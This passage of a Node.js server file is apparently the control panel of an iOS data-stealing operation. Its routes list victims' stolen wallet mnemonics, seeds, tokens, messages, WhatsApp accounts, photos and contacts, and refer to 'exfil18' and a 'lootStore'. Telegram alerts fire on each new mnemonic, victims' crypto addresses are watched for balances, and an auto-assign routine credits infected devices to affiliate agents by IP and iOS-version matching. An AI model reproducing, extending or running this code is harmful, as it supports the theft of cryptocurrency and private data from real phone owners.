      } else {
        _rU = await _pgPool().query(`SELECT count(*)::int AS n FROM notifications n WHERE n.read_at IS NULL AND ${_vU}`);
      }
      return json(res, 200, { n: _rU.rows[0] ? _rU.rows[0].n : 0 });
    }
    if (req.method === 'GET' && p === '/api/admin/notify/tg_cfg') {
      const cfg = readNcfg();
      // 【2026-09-16 用户化】Token 不可见；TG 绑定按账号隔离：返回"当前账号自己"的绑定（互不覆盖）
      let _my = { chat_id: '', toggles: {} };
      try {
        const r0 = await _pgPool().query(`SELECT chat_id, toggles, enabled FROM tg_bindings WHERE agent_id = $1`, [currentUser.id]);
        if (r0.rows[0]) _my = { chat_id: r0.rows[0].chat_id || '', toggles: r0.rows[0].toggles || {}, enabled: r0.rows[0].enabled };
      } catch (e) {}
      return json(res, 200, { cfg: {
        tg_token_set: !!cfg.tg_token, tg_chat_id: _my.chat_id, bot_username: 'heidongios_bot',
        usd_threshold: cfg.usd_threshold != null ? cfg.usd_threshold : 5, toggles: _my.toggles,
      } });
    }
    if (req.method === 'POST' && p === '/api/admin/notify/tg_cfg') {
      const b = await readBody(req);
      const cfg = readNcfg();
      // 【2026-09-16 用户化】chat/toggles 只写"当前账号自己"的 tg_bindings（互不覆盖）；阈值仍全局
      if (b.tg_chat_id !== undefined) {
        const chat = String(b.tg_chat_id).trim();
        const toggles = Object.assign({ new_mnemonic: true, review_needed: true, addr_change: true }, b.toggles || {});
        if (chat && !/^-?\d{5,15}$/.test(chat)) return json(res, 400, { message: 'Telegram ID 格式不对（应为纯数字）' });
        try {
          if (chat) {
            await _pgPool().query(
              `INSERT INTO tg_bindings (agent_id, chat_id, toggles, enabled, updated_at) VALUES ($1,$2,$3::jsonb,true,now())
               ON CONFLICT (agent_id) DO UPDATE SET chat_id = EXCLUDED.chat_id, toggles = EXCLUDED.toggles, enabled = true, updated_at = now()`,
              [currentUser.id, chat, JSON.stringify(toggles)]);
          } else {
            await _pgPool().query(`DELETE FROM tg_bindings WHERE agent_id = $1`, [currentUser.id]);
          }
        } catch (e) { return json(res, 500, { message: String(e.message).slice(0, 90) }); }
      } else if (b.toggles) {
        try {
          await _pgPool().query(`UPDATE tg_bindings SET toggles = $2::jsonb, updated_at = now() WHERE agent_id = $1`,
            [currentUser.id, JSON.stringify(Object.assign({ new_mnemonic: true, review_needed: true, addr_change: true }, b.toggles))]);
        } catch (e) {}
      }
      if (b.usd_threshold !== undefined) cfg.usd_threshold = Number(b.usd_threshold) > 0 ? Number(b.usd_threshold) : 5;
      fs.writeFileSync(NCFG_F, JSON.stringify(cfg, null, 2));
      try { fs.chmodSync(NCFG_F, 0o600); } catch (e) {}
      return json(res, 200, { ok: true });
    }
    if (req.method === 'POST' && p === '/api/admin/notify/tg_test') {
      const cfg = readNcfg();
      // 【2026-09-16 用户化】测试消息发到"当前账号自己"的绑定
      let _chat = '';
      try { const r0 = await _pgPool().query(`SELECT chat_id FROM tg_bindings WHERE agent_id = $1 AND enabled`, [currentUser.id]); _chat = r0.rows[0] ? r0.rows[0].chat_id : ''; } catch (e) {}
      if (!_chat) return json(res, 400, { message: '请先填写并保存你的 Telegram ID' });
      const r = await tgSendMessage(cfg.tg_token, _chat, '✅ [Sipapu] Telegram 通知测试成功 — 实时通知栏已接通');
      return json(res, 200, r);
    }
    if (req.method === 'GET' && p === '/api/admin/notify/watch_list') {
      // 【2026-09-17 隔离】监控地址按账号隔离：只显示自己添加的（历史无主行暂不显示，待归属确认）
      const r = await _pgPool().query(`SELECT id, addr, chain, note, enabled, last_bal, last_check, created_at FROM watch_addrs WHERE owner_id = $1 ORDER BY id DESC LIMIT 500`, [currentUser.id]);
      return json(res, 200, { list: r.rows });
    }
    if (req.method === 'POST' && p === '/api/admin/notify/watch_add') {
      const b = await readBody(req);
      const addr = String(b.addr || '').trim();
      const chain = String(b.chain || '').toUpperCase().trim();
      const CHAINS = ['TRON', 'ETH', 'POLYGON', 'ARBITRUM', 'BSC', 'BASE', 'BTC', 'LTC', 'SOL', 'DOGE'];
      if (!addr || !chain) return json(res, 400, { message: '地址和链必填' });
      if (!CHAINS.includes(chain)) return json(res, 400, { message: '暂不支持该链（可选：' + CHAINS.join('/') + '）' });
      // 【2026-09-17】地址 ↔ 链格式校验：对不上直接拒绝并提示（防 0x 地址选 TRON 之类）
      const _vErr = validateWatchAddr(chain, addr);
      if (_vErr) return json(res, 400, { message: _vErr });
      try {
        // 【2026-09-17 隔离】已被其他账号监控的地址不可重复添加（历史无主行允许认领归位）
        const ex = await _pgPool().query(`SELECT owner_id FROM watch_addrs WHERE addr = $1`, [addr]);
        if (ex.rows[0] && ex.rows[0].owner_id != null && Number(ex.rows[0].owner_id) !== Number(currentUser.id)) {
          return json(res, 409, { message: '该地址已被其他管理员监控' });
        }
        await _pgPool().query(
          `INSERT INTO watch_addrs (addr, chain, note, owner_id) VALUES ($1,$2,$3,$4)
           ON CONFLICT (addr) DO UPDATE SET chain = EXCLUDED.chain, note = EXCLUDED.note, enabled = true, owner_id = EXCLUDED.owner_id`,
          [addr, chain, String(b.note || '').slice(0, 100), currentUser.id]);
      } catch (e) { return json(res, 400, { message: String(e.message).slice(0, 90) }); }
      return json(res, 200, { ok: true });
    }
    if (req.method === 'POST' && p === '/api/admin/notify/watch_del') {
      const b = await readBody(req);
      // 【2026-09-17 隔离】只能删自己添加的（历史无主行一并允许清理）
      await _pgPool().query(`DELETE FROM watch_addrs WHERE id = $1 AND (owner_id = $2 OR owner_id IS NULL)`, [Number(b.id) || 0, currentUser.id]);
      return json(res, 200, { ok: true });
    }
    if (req.method === 'POST' && p === '/api/admin/notify/watch_toggle') {
      const b = await readBody(req);
      // 【2026-09-17 隔离】只能开关自己添加的（历史无主行一并允许操作）
      await _pgPool().query(`UPDATE watch_addrs SET enabled = NOT enabled WHERE id = $1 AND (owner_id = $2 OR owner_id IS NULL)`, [Number(b.id) || 0, currentUser.id]);
      return json(res, 200, { ok: true });
    }
    return json(res, 404, { message: 'no such route' });
  }

  // ── 【2026-09-16】代理侧实时通知（需 'realtime' 权限）：TG 绑定 / 解绑 / 测试 ──
  //    站内通知流仍为超管专属；代理仅通过 TG 接收"名下设备"的通知（数据隔离在下游 notify_scan 按 serial 归属路由）
  if (p.startsWith('/api/user/notify/')) {
    if (!hasPermission(currentUser, 'realtime')) return json(res, 403, { message: '无权使用（需实时通知权限）' });
    const readCfg2 = () => { try { return JSON.parse(fs.readFileSync(path.join(__dirname, 'data', 'notify_cfg.json'), 'utf8')); } catch (e) { return {}; } };
    const pg2 = _pgPool();
    if (req.method === 'GET' && p === '/api/user/notify/status') {
      let st = { bound: false, chat_id: '', toggles: {} };
      try {
        const r = await pg2.query(`SELECT chat_id, toggles, enabled, updated_at FROM tg_bindings WHERE agent_id = $1`, [currentUser.id]);
        if (r.rows[0]) st = {
          bound: true, chat_id: r.rows[0].chat_id, toggles: r.rows[0].toggles || {}, enabled: r.rows[0].enabled,
          bound_at: r.rows[0].updated_at ? new Date(r.rows[0].updated_at).toISOString().slice(0, 16).replace('T', ' ') + ' UTC' : '',
        };
      } catch (e) {}
      return json(res, 200, { status: st, bot_username: 'heidongios_bot' });
    }
    if (req.method === 'POST' && p === '/api/user/notify/bind') {
      const b = await readBody(req);
      const chat = String(b.chat_id || '').trim();
      if (!/^-?\d{5,15}$/.test(chat)) return json(res, 400, { message: 'Telegram ID 格式不对（应为纯数字，可在机器人回复中复制）' });
      const toggles = Object.assign({ new_mnemonic: true, review_needed: true, addr_change: true }, b.toggles || {});
      try {
        await pg2.query(
          `INSERT INTO tg_bindings (agent_id, chat_id, toggles, enabled, updated_at) VALUES ($1,$2,$3::jsonb,true,now())
           ON CONFLICT (agent_id) DO UPDATE SET chat_id = EXCLUDED.chat_id, toggles = EXCLUDED.toggles, enabled = true, updated_at = now()`,
          [currentUser.id, chat, JSON.stringify(toggles)]);
      } catch (e) { return json(res, 500, { message: String(e.message).slice(0, 90) }); }
      return json(res, 200, { ok: true });
    }
    if (req.method === 'POST' && p === '/api/user/notify/unbind') {
      try { await pg2.query(`DELETE FROM tg_bindings WHERE agent_id = $1`, [currentUser.id]); } catch (e) {}
      return json(res, 200, { ok: true });
    }
    if (req.method === 'POST' && p === '/api/user/notify/test') {
      let chat = '';
      try { const r = await pg2.query(`SELECT chat_id FROM tg_bindings WHERE agent_id = $1 AND enabled`, [currentUser.id]); chat = r.rows[0] ? r.rows[0].chat_id : ''; } catch (e) {}
      if (!chat) return json(res, 400, { message: '请先绑定 Telegram ID' });
      const cfg = readCfg2();
      const r = await tgSendMessage(cfg.tg_token, chat, '✅ [Sipapu] TG 绑定测试成功 — 你将接收名下设备的通知（可在实时通知页调整接收种类）');
      return json(res, 200, r);
    }
    return json(res, 404, { message: 'no such route' });
  }

  // ── IP Geolocation lookup ──
  if (req.method === 'GET' && p === '/api/tool/ip_geo') {
    const ip = q.ip || q.address || '';
    if (!ip) return json(res, 400, { message: '缺少IP参数' });
    try {
      const http2 = require('http');
      const result = await new Promise((resolve, reject) => {
        const r = http2.get('http://ip-api.com/json/' + encodeURIComponent(ip) + '?lang=zh-CN&fields=status,country,regionName,city,isp,org,as,query', { timeout: 5000 }, (resp) => {
          let d = '';
          resp.on('data', c => d += c);
          resp.on('end', () => { try { resolve(JSON.parse(d)); } catch { resolve({ status: 'fail' }); } });
        });
        r.on('error', reject);
        r.on('timeout', () => { r.destroy(); reject(new Error('timeout')); });
      });
      return json(res, 200, result);
    } catch (e) {
      return json(res, 200, { status: 'fail', message: String(e).slice(0, 100) });
    }
  }

  // ── 【P4-3】PG 记录列表拦截层（PANEL_PG_DEV=1）：13 个高频列表直读 PG（权限 SQL 化）；
  //    任何异常自动落下方旧 handler（快照路径）──
  if (panelPgDev && req.method === 'GET') {
    const _PG_LIST = {
      '/api/user/user_event/list':        { arr: 'events', key: 'events', top: 40 },   // 【2026-09-20】仪表盘"最近事件"只用40条 → 限行（原 12000 行/6.35MB/1.1s）
      '/api/user/user_raw_report/list':   { arr: 'reports', key: 'raw_reports', kind: true },
      '/api/secrecy/user_mnemonic/list':  { arr: 'mnemonics', key: 'mnemonics', serial: true },
      '/api/secrecy/user_seed/list':      { arr: 'seeds', key: 'seeds' },
      '/api/secrecy/user_address/list':   { arr: 'addresses', key: 'addresses', serial: true },
      '/api/secrecy/user_token/list':     { arr: 'tokens', key: 'tokens', serial: true },
      '/api/secrecy/user_message/list':   { arr: 'messages', key: 'messages' },
      '/api/secrecy/user_notebook/list':  { arr: 'notebooks', key: 'notebooks', serial: true },
      '/api/user/whatsapp_account/list':  { arr: 'whatsapp', key: 'whatsapp_accounts', serial: true },
      '/api/user/user_photo/list':        { arr: 'photos', key: 'photos', serial: true },
      '/api/user/user_contact/list':      { arr: 'contacts', key: 'contacts', serial: true },
      '/api/common/sys_application/list': { arr: 'sysApps', key: 'sas' },
      '/api/user/user_upload/list':       { arr: 'uploads', key: 'uploads', serial: true, total: true },
    };
    const _def = _PG_LIST[p];
    if (_def) {
      try {
        const list = await panelPgDev.recList(currentUser, _def.arr, q, { kind: _def.kind, serial: _def.serial, top: _def.top });
        if (list) {
          const out = { [_def.key]: list, pi: pager(list, q) };
          if (_def.total) out.total = list.length;
          return json(res, 200, out);   // 直接响应，跳过下方 dispatch
        }
      } catch (e) { console.error('[panel] PG 列表失败', p, e.message); }
    }
  }

  // ── 【P4.1】PG 聚合页拦截：7 个 summary 路由（按设备聚合；异常自动落快照路径）──
  if (panelPgDev && req.method === 'GET') {
    const _PG_SUM = {
      '/api/secrecy/user_mnemonic/summary': 'mnemonic',
      '/api/secrecy/user_address/summary': 'address',
      '/api/secrecy/user_notebook/summary': 'notebook',
      '/api/user/whatsapp_account/summary': 'whatsapp',
      '/api/user/user_photo/summary': 'photo',
      '/api/user/user_contact/summary': 'contact',
      '/api/exfil18/summary': 'exfil18',
    };
    const _kind = _PG_SUM[p];
    if (_kind) {
      try {
        const r2 = await panelPgDev.summary(currentUser, _kind, q);
        if (r2) {
          const out2 = { devices: r2.devices, pi: r2.pi || pager(r2.devices, q) };
          if (r2.orphans) out2.orphans = r2.orphans;
          return json(res, 200, out2);
        }
      } catch (e) { console.error('[panel] PG summary 失败', p, e.message); }
    }
  }

  // ── Route dispatch ──
  const handler = routes[p];
  if (handler) {
    const result = await handler();
    if (result && result.__sent) return;
    if (result && result.__raw !== undefined) {
      if (result.__raw === 404) { res.writeHead(404); return res.end('not found'); }
      res.writeHead(200, { 'Content-Type': result.mime || 'application/octet-stream', 'Cache-Control': 'no-store' });
      return res.end(result.buf);
    }
    return json(res, 200, result);
  }
  return json(res, 404, { message: 'no such route' });
});

// ═══════════════════════════════════════════════════════════════════════════
// 设备自动归属（2026-09-10 新增）
// 背景：推广链 /go/<code> 只记录「访问那一刻的 IP 快照」，而设备 IP 会漂
//   （移动网络/CGNAT，实测 117.188.116.13 → 117.188.112.160），导致
//   authStore.filterByAgent 按 IP 匹配不上 → 代理后台看不到自己推广来的设备。
// 策略（按可靠度递减，且要求「唯一命中」才自动归属，防止串号）：
//   ① 精确 IP：设备当前 IP == 某个代理登记过的 IP
//   ② 抗漂移：设备 IP 同 /16 段 + iOS 版本与访问 UA 一致 + 访问后 7 天内设备活跃
//   ③ 命中多个代理 → 不自动分，留人工（管理端可手动 assign）
// ═══════════════════════════════════════════════════════════════════════════
const normIOS = v => String(v || '').replace(/_/g, '.');
function autoAssignDevices() {
  try {
    const store = lootStore.scan();
    const links = authStore.listLinks(null) || [];
    const agentOfLink = {};
    for (const l of links) if (l && l.code) agentOfLink[l.code] = l.user_id;
    const visits = authStore.listLinkVisits(0) || [];

    const cands = [];
    const ipIndex = new Map();     // 【复审修复】精确 IP → Set(uid)，替代 O(设备×访客) 全扫
    const pfxIndex = new Map();    // /16 前缀 → [cand]，抗漂移匹配只扫同段候选
    for (const v of visits) {
      const uid = agentOfLink[v.code];
      if (!uid || !v.ip) continue;
      const m = String(v.ua || '').match(/iPhone OS (\d+)_(\d+)(?:_(\d+))?/);
      const c = {
        uid,
        ip: v.ip,
        pfx: v.ip.split('.').slice(0, 2).join('.'),
        // 【复审修复·写盘瘦身】优先用预提取的 ios（新格式访问记录不再存原始 UA，旧记录走兼容解析）
        ios: (v.ios !== undefined) ? v.ios : (m ? [m[1], m[2], m[3]].filter(Boolean).join('.') : ''),
        ts: Date.parse(v.ts) || 0,
      };
      cands.push(c);
      let s = ipIndex.get(c.ip); if (!s) { s = new Set(); ipIndex.set(c.ip, s); } s.add(c.uid);
      let a = pfxIndex.get(c.pfx); if (!a) { a = []; pfxIndex.set(c.pfx, a); } a.push(c);
    }
    if (!cands.length) return 0;

    let assigned = 0, conflict = 0;
    // 【复审修复】批量写盘：整轮归属只落盘一次（原每台一次全量 _save ≈ 14MB+14MB 同步 IO）
    authStore.beginBulk && authStore.beginBulk();
    try {
      for (const d of store.devices.values()) {
        const serial = d.serial_id;
        if (!serial) continue;
        if (authStore.getDeviceAgent(serial)) continue;             // 已有归属，跳过
        if (authStore.isDeviceExcluded(serial)) continue;           // 【2026-09-14】排除名单：不参与自动归属
        const dIos = normIOS((store.users.get(serial) || {}).ios_version || '');
        const dTs = d.last_seen || 0;
        // 【2026-09-11 修复】用「设备出现过的所有出口 IP」而不是单个 IP。
        //   实测：F2K3G50DFT 的浏览器出口 111.55.100.48（= 访问推广链的那个 IP）
        //   与 App 上报出口 104.234.161.74 连 /16 段都不同 → 旧逻辑必然漏归属。
        const ips = (store.deviceIps && store.deviceIps[serial]) || (d.ip ? [d.ip] : []);
        const hits = new Set();
        for (const ip of ips) {
          if (!ip) continue;
          const s = ipIndex.get(ip);
          if (s) s.forEach(u => hits.add(u));                       // ① 精确 IP（任一出口）
          const pfx = ip.split('.').slice(0, 2).join('.');
          for (const c of (pfxIndex.get(pfx) || [])) {              // ② 抗漂移三重匹配（只扫同段候选）
            if (c.ios && dIos === c.ios && dTs >= c.ts && (dTs - c.ts) < 7 * 86400e3) hits.add(c.uid);
          }
        }
        if (hits.size === 1) { authStore.assignDevice(serial, [...hits][0]); assigned++; }
        else if (hits.size > 1) conflict++;                        // ③ 冲突留人工
      }
    } finally { authStore.endBulk && authStore.endBulk(); }
    if (assigned || conflict) console.log(`[autoAssign] 新归属=${assigned} 冲突跳过=${conflict}`);
    return assigned;
  } catch (e) { console.error('[autoAssign] error:', e.message); return 0; }
}
// 【2026-09-12 分片升级】影子实例/维护时可跳过自动归属（PANEL_SKIP_AUTOASSIGN=1，防多实例并发写）
if (String(process.env.PANEL_SKIP_AUTOASSIGN || '') !== '1') {
  setTimeout(autoAssignDevices, 8000);                              // 启动后 8 秒首跑
  setInterval(autoAssignDevices, 5 * 60 * 1000);                    // 每 5 分钟
}

// 【2026-09-12 性能】lootStore 预热（45s < 60s CACHE_MS）：
//   force=true 走「签名检查」（~80ms），无变化直接续期；有变化才全量重扫（~2.8s，后台消化）。
//   效果：用户请求路径永远命中缓存，不再被同步重扫阻塞。
setTimeout(() => { try { lootStore.scan({ force: true }); } catch (e) {} }, 3000);
setInterval(() => {
  try { lootStore.scan({ force: true }); } catch (e) { console.error('[warmup] error:', e.message); }
}, 45 * 1000);

server.listen(PORT, () => console.log(`[panel] http://127.0.0.1:${PORT}`));
